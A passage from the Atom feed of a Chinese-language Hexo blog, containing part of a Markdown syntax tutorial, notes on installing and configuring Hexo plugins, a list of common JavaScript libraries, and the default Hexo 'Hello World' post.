这是第一行列表项。</span><br><span class="line"> &gt; 2.   这是第二行列表项。</span><br><span class="line"> &gt; </span><br><span class="line"> &gt; 给出一些例子代码：</span><br><span class="line"> &gt; </span><br><span class="line"> &gt;     return shell_exec(&quot;echo $input | $markdown_script&quot;);</span><br></pre></td></tr></table></figure><blockquote><p>简单引用1<br>简单引用2</p><p>多行引用</p><blockquote><p>嵌套引用</p></blockquote></blockquote><blockquote><p> 引用中使用Markdown语法。</p><ol><li>这是第一行列表项。</li><li>这是第二行列表项。</li></ol><p>给出一些例子代码：</p><pre><code>return shell_exec(&quot;echo $input | $markdown_script&quot;);</code></pre></blockquote><h3 id="代码引用"><a href="#代码引用" class="headerlink" title="代码引用"></a>代码引用</h3><blockquote><p>需要引用代码时，如果引用的语句只有一段，不分行，可以用`将语句包起来。<br>如果引用的语句为多行，可以将```置于这段代码的首行和末行。</p></blockquote><h3 id="分隔线"><a href="#分隔线" class="headerlink" title="分隔线"></a>分隔线</h3><blockquote><p>一行中用三个以上的星号、减号、底线来建立一个分隔线,行内不能有其他东西,<br>也可以在星号或是减号中间插入空格</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">---</span><br></pre></td></tr></table></figure><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- - -</span><br></pre></td></tr></table></figure><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">***</span><br></pre></td></tr></table></figure><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * *</span><br></pre></td></tr></table></figure><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">——————————————</span><br></pre></td></tr></table></figure><p>——————————————</p><h3 id="段落和换行"><a href="#段落和换行" class="headerlink" title="段落和换行"></a>段落和换行</h3><blockquote><p>段落</p></blockquote><p>段落是由一个或多个连续的文本行组成,<br>它的前后要一个以上的空行(显示上看起来像是空的)</p><blockquote><p>换行</p></blockquote><p>Mardown允许段落内的强迫换行(插入换行符)<br>要依赖Markdown来插入<code>&lt;br/&gt;</code>标签的话,在<code>&lt;br/&gt;</code>插入处要先按入两个以上的空格然后回车</p><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><blockquote><p>居中</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> Tables        | Are           | Cool  </span><br><span class="line">:------------: |:-------------:|:-----:</span><br><span class="line"> col 3 is      | right-aligned | $1600 </span><br><span class="line"> col 2 is      | centered      |   $12 </span><br><span class="line"> zebra stripes | are neat      |    $1 </span><br><span class="line">或</span><br><span class="line">| Tables        | Are           | Cool  |</span><br><span class="line">| ------------- |:-------------:| -----:|</span><br><span class="line">| col 3 is      | right-aligned | $1600 |</span><br><span class="line">| col 2 is      | centered      |   $12 |</span><br><span class="line">| zebra stripes | are neat      |    $1 |</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:center">Tables</th><th style="text-align:center">Are</th><th style="text-align:center">Cool  </th></tr></thead><tbody><tr><td style="text-align:center"> col 3 is</td><td style="text-align:center">right-aligned</td><td style="text-align:center">$1600 </td></tr><tr><td style="text-align:center"> col 2 is</td><td style="text-align:center">centered</td><td style="text-align:center">$12 </td></tr><tr><td style="text-align:center"> zebra stripes</td><td style="text-align:center">are neat</td><td style="text-align:center">$1 </td></tr></tbody></table><blockquote><p>不居中</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dog | bird | cat</span><br><span class="line">----|------|----</span><br><span class="line">foo | foo  | foo</span><br><span class="line">bar | bar  | bar</span><br><span class="line">baz | baz  | baz</span><br></pre></td></tr></table></figure><table><thead><tr><th>dog</th><th>bird</th><th>cat</th></tr></thead><tbody><tr><td>foo</td><td>foo</td><td>foo</td></tr><tr><td>bar</td><td>bar</td><td>bar</td></tr><tr><td>baz</td><td>baz</td><td>baz</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">1、简单方式写表格：</span><br><span class="line"></span><br><span class="line">学号|姓名|分数</span><br><span class="line">-|-|-</span><br><span class="line">小明|男|75</span><br><span class="line">小红|女|79</span><br><span class="line">小陆|男|92</span><br><span class="line"></span><br><span class="line">2、原生方式写表格：</span><br><span class="line"></span><br><span class="line">|学号|姓名|分数|</span><br><span class="line">|-|-|-|</span><br><span class="line">|小明|男|75|</span><br><span class="line">|小红|女|79|</span><br><span class="line">|小陆|男|92|</span><br><span class="line"></span><br><span class="line">3、为表格第二列指定方向：</span><br><span class="line"></span><br><span class="line">产品|价格</span><br><span class="line">-|-:</span><br><span class="line">Leanote 高级账号|60元/年</span><br><span class="line">Leanote 超级账号|120元/年</span><br></pre></td></tr></table></figure><p>1、简单方式写表格：</p><table><thead><tr><th>学号</th><th>姓名</th><th>分数</th></tr></thead><tbody><tr><td>小明</td><td>男</td><td>75</td></tr><tr><td>小红</td><td>女</td><td>79</td></tr><tr><td>小陆</td><td>男</td><td>92</td></tr></tbody></table><p>2、原生方式写表格：</p><table><thead><tr><th>学号</th><th>姓名</th><th>分数</th></tr></thead><tbody><tr><td>小明</td><td>男</td><td>75</td></tr><tr><td>小红</td><td>女</td><td>79</td></tr><tr><td>小陆</td><td>男</td><td>92</td></tr></tbody></table><p>3、为表格第二列指定方向：</p><table><thead><tr><th>产品</th><th style="text-align:right">价格</th></tr></thead><tbody><tr><td>Leanote 高级账号</td><td style="text-align:right">60元/年</td></tr><tr><td>Leanote 超级账号</td><td style="text-align:right">120元/年</td></tr></tbody></table><h3 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h3><blockquote><p>使用反斜杠来插入一些在语法中有其它意义的符号,如*<br>需要转义的字符:</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">\   反斜线</span><br><span class="line">`   反引号</span><br><span class="line">*   星号</span><br><span class="line">_   底线</span><br><span class="line">&#123;&#125;  花括号</span><br><span class="line">[]  方括号</span><br><span class="line">()  括弧</span><br><span class="line">#   井字号</span><br><span class="line">+   加号</span><br><span class="line">-   减号</span><br><span class="line">.   英文句点</span><br><span class="line">!   惊叹号</span><br></pre></td></tr></table></figure><h3 id="锚点"><a href="#锚点" class="headerlink" title="锚点"></a>锚点</h3><p>网页中，锚点其实就是页内超链接，也就是链接本文档内部的某些元素，实现当前页面中的跳转。比如我这里写下一个锚点，点击回到目录，就能跳转到目录。 在目录中点击这一节，就能跳过来。还有下一节的注脚。这些根本上都是用锚点来实现的。<br>注意： </p><ol><li>Markdown Extra 只支持在标题后插入锚点，其它地方无效。 </li><li>Leanote 编辑器右侧显示效果区域暂时不支持锚点跳转，所以点来点去发现没有跳转不必惊慌，但是你发布成笔记或博文后是支持跳转的。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">## 0. 目录&#123;#index&#125;</span><br><span class="line">跳转到[目录](#index)</span><br></pre></td></tr></table></figure><h3 id="注脚"><a href="#注脚" class="headerlink" title="注脚"></a>注脚</h3><blockquote><p>在需要添加注脚的文字后加上脚注名字[^注脚名字],称为加注。 然后在文本的任意位置(一般在最后)添加脚注，脚注前必须有对应的脚注名字。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用 Markdown[^1]可以效率的书写文档, 直接转换成 HTML[^2] ,你可以使用 Leanote[^Le] 编辑器进行书写。</span><br><span class="line">[^1]:Markdown是一种纯文本标记语言</span><br><span class="line">[^2]:HyperText Markup Language 超文本标记语言</span><br><span class="line">[^Le]:开源笔记平台，支持Markdown和笔记直接发为博文</span><br></pre></td></tr></table></figure><p>使用 Markdown<a href="Markdown是一种纯文本标记语言">^1</a>可以效率的书写文档, 直接转换成 HTML<a href="HyperTextMarkupLanguage超文本标记语言">^2</a> ,你可以使用 Leanote<a href="开源笔记平台，支持Markdown和笔记直接发为博文">^Le</a> 编辑器进行书写。</p></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Markdown 是一种轻量级的「标记语言」，使用用特殊的 Markdown 文档处理器将 Markdown 语法翻译成预设的文档格式、标题大小等，一般用于展示时输出的是 HTML。&lt;br&gt;
    
    </summary>
    
      <category term="Markdown" scheme="https://jiuylq.github.io/categories/Markdown/"/>
    
    
      <category term="Markdown" scheme="https://jiuylq.github.io/tags/Markdown/"/>
    
  </entry>
  
  <entry>
    <title>plugins-hexo</title>
    <link href="https://jiuylq.github.io/2017/11/05/plugins-hexo/"/>
    <id>https://jiuylq.github.io/2017/11/05/plugins-hexo/</id>
    <published>2017-11-05T13:40:59.000Z</published>
    <updated>2019-04-07T04:18:53.917Z</updated>
    
    <content type="html"><![CDATA[<p>  Hexo博客常用插件及用法<br><a id="more"></a></p><the rest of contents | 余下全文><h2 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h2><p>Doc：<a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">https://hexo.io/zh-cn/</a><br>Api：<a href="https://hexo.io/zh-cn/api/" target="_blank" rel="noopener">https://hexo.io/zh-cn/api/</a><br>Plugins：<a href="https://hexo.io/plugins/" target="_blank" rel="noopener">https://hexo.io/plugins/</a><br>Themes：<a href="https://hexo.io/themes/" target="_blank" rel="noopener">https://hexo.io/themes/</a></p><h2 id="hexo-generator-json-content"><a href="#hexo-generator-json-content" class="headerlink" title="hexo-generator-json-content"></a>hexo-generator-json-content</h2><p>Github：<a href="https://github.com/alexbruno/hexo-generator-json-content" target="_blank" rel="noopener">https://github.com/alexbruno/hexo-generator-json-content</a><br>简介：用于生成静态站点数据，提供搜索功能的数据源。<br>安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-json-content --save</span><br></pre></td></tr></table></figure></p><p>配置：<br>在博客配置文件_config.yml中添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jsonContent:</span><br><span class="line">  ignore:</span><br><span class="line">    - path/to/a/page</span><br><span class="line">    - url/to/one/post</span><br><span class="line">    - an-entire-category</span><br><span class="line">    - specific.file</span><br><span class="line">    - .ext # a file extension</span><br></pre></td></tr></table></figure></p><h2 id="hexo-neat"><a href="#hexo-neat" class="headerlink" title="hexo-neat"></a>hexo-neat</h2><p>Github：<a href="https://github.com/rozbo/hexo-neat" target="_blank" rel="noopener">https://github.com/rozbo/hexo-neat</a><br>简介：自动压缩html、css、js代码<br>安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-neat --save</span><br></pre></td></tr></table></figure></p><p>配置：<br>在博客配置文件_config.yml中添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">neat_enable: true</span><br></pre></td></tr></table></figure></p><p>压缩html代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">neat_html:</span><br><span class="line">  enable: true</span><br><span class="line">  exclude:</span><br></pre></td></tr></table></figure></p><p>压缩CSS<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">neat_css:</span><br><span class="line">  enable: true</span><br><span class="line">  exclude:</span><br><span class="line">    - &apos;*.min.css&apos;</span><br></pre></td></tr></table></figure></p><p>压缩JS<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">neat_js:</span><br><span class="line">  enable: true</span><br><span class="line">  mangle: true</span><br><span class="line">  output:</span><br><span class="line">  compress:</span><br><span class="line">  exclude:</span><br><span class="line">    - &apos;*.min.js&apos;</span><br></pre></td></tr></table></figure></p><h2 id="hexo-wordcount"><a href="#hexo-wordcount" class="headerlink" title="hexo-wordcount"></a>hexo-wordcount</h2><p>Github：<a href="https://github.com/willin/hexo-wordcount" target="_blank" rel="noopener">https://github.com/willin/hexo-wordcount</a><br>A Word Count Plugin for Hexo <a href="https://npmjs.org/package/hexo-wordcount" target="_blank" rel="noopener">https://npmjs.org/package/hexo-wordcount</a><br>简介：为文章添加文章字数统计、文章预计阅读时间<br>安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-wordcount --save</span><br></pre></td></tr></table></figure></p><p>使用：<br>通过以上安装后，你可以在你的模板文件加入以下相关的标签实现本插件的功能<br><strong>字数统计:</strong>WordCount<br><strong>阅读时长预计:</strong>Min2Read<br>总字数统计: TotalCount</p><blockquote><p>Ejs</p></blockquote><p>Post Count:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;span class=&quot;post-count&quot;&gt;&lt;%= wordcount(post.content) %&gt;&lt;/span&gt;</span><br></pre></td></tr></table></figure></p><p>Post Minutes to Read:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;span class=&quot;post-count&quot;&gt;&lt;%= min2read(post.content) %&gt;&lt;/span&gt;</span><br></pre></td></tr></table></figure></p><p>Total Count:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;span class=&quot;post-count&quot;&gt;&lt;%= totalcount(site) %&gt;&lt;/span&gt;</span><br></pre></td></tr></table></figure></p><h2 id="hexo-generator-json-content-1"><a href="#hexo-generator-json-content-1" class="headerlink" title="hexo-generator-json-content"></a>hexo-generator-json-content</h2></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;  Hexo博客常用插件及用法&lt;br&gt;
    
    </summary>
    
      <category term="plugins" scheme="https://jiuylq.github.io/categories/plugins/"/>
    
    
      <category term="plugins" scheme="https://jiuylq.github.io/tags/plugins/"/>
    
  </entry>
  
  <entry>
    <title>js-plugins</title>
    <link href="https://jiuylq.github.io/2017/10/30/plugins/"/>
    <id>https://jiuylq.github.io/2017/10/30/plugins/</id>
    <published>2017-10-30T14:35:37.000Z</published>
    <updated>2017-11-05T14:35:27.250Z</updated>
    
    <content type="html"><![CDATA[<p>  日常中常用到的js plugins。<br><a id="more"></a></p><the rest of contents | 余下全文><h1 id="plugins-https-github-com-jawil-blog-issues-10"><a href="#plugins-https-github-com-jawil-blog-issues-10" class="headerlink" title="plugins  https://github.com/jawil/blog/issues/10"></a>plugins  <a href="https://github.com/jawil/blog/issues/10" target="_blank" rel="noopener">https://github.com/jawil/blog/issues/10</a></h1><h2 id="pdf-js"><a href="#pdf-js" class="headerlink" title="pdf.js"></a><font size="15" face="黑体">pdf.js</font></h2><p>  <font color="#0099ff"><em>PDF.js is a Portable Document Format (PDF) viewer that is built with HTML5</em></font><br>  <a href="http://github.com/mozilla/pdf.js" target="_blank" rel="noopener">github</a>  </p><h2 id="highlight-js"><a href="#highlight-js" class="headerlink" title="highlight.js"></a>highlight.js</h2><p>Highlight.js is a syntax highlighter written in JavaScript. It works in the browser as well as on the server. It works with pretty much any markup, doesn’t depend on any framework and has automatic language detection.<br><a href="https://github.com/isagalaev/highlight.js" target="_blank" rel="noopener">github</a>  </p><h2 id="clipboard-js"><a href="#clipboard-js" class="headerlink" title="clipboard.js"></a>clipboard.js</h2><p><em>A modern approach to copy text to clipboard</em><br><a href="https://github.com/zenorocha/clipboard.js" target="_blank" rel="noopener">github</a> <a href="https://clipboardjs.com/" target="_blank" rel="noopener">官网</a>  </p><h2 id="cropperjs"><a href="#cropperjs" class="headerlink" title="cropperjs"></a>cropperjs</h2><p><em>JavaScript image cropper</em><br><a href="https://github.com/fengyuanchen/cropperjs" target="_blank" rel="noopener">github</a>  </p><h2 id="Lazy-Loading"><a href="#Lazy-Loading" class="headerlink" title="Lazy Loading"></a>Lazy Loading</h2><ol><li><p>Echo<br><em>简单易用的图片延迟加载插件</em><br><a href="https://github.com/toddmotto/echo" target="_blank" rel="noopener">github</a> <a href="https://toddmotto.com/echo-js-simple-javascript-image-lazy-loading/" target="_blank" rel="noopener">官方</a>  </p></li><li><p>Lazyr.js<br><em>延迟加载图片（Lazy Loading）</em><br><a href="https://github.com/callmecavs/layzr.js" target="_blank" rel="noopener">github</a> <a href="http://callmecavs.com/layzr.js/" target="_blank" rel="noopener">官方</a>  </p></li></ol><h2 id="better-scroll-js"><a href="#better-scroll-js" class="headerlink" title="better-scroll.js"></a>better-scroll.js</h2><p><em>小巧，灵活的 JavaScript 模拟滚动条的插件</em><br><a href="https://github.com/ustbhuangyi/better-scroll" target="_blank" rel="noopener">github</a> <a href="https://ustbhuangyi.github.io/better-scroll/" target="_blank" rel="noopener">官方</a>  </p><h2 id="better-picker"><a href="#better-picker" class="headerlink" title="better-picker"></a>better-picker</h2><p><em>一款轻量级IOS风格的JavaScript选择器</em><br><a href="https://github.com/ustbhuangyi/picker" target="_blank" rel="noopener">github</a> <a href="http://ustbhuangyi.github.io/picker/" target="_blank" rel="noopener">官方</a>  </p></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;  日常中常用到的js plugins。&lt;br&gt;
    
    </summary>
    
      <category term="plugins" scheme="https://jiuylq.github.io/categories/plugins/"/>
    
    
      <category term="plugins" scheme="https://jiuylq.github.io/tags/plugins/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://jiuylq.github.io/2017/07/07/hello-world/"/>
    <id>https://jiuylq.github.io/2017/07/07/hello-world/</id>
    <published>2017-07-07T07:51:28.000Z</published>
    <updated>2019-04-07T04:20:44.648Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><a id="more"></a><the rest of contents | 余下全文><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p><!-- <div class="pdf" target="./pdf/ajax.pdf" height=""></div> –&gt;--></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
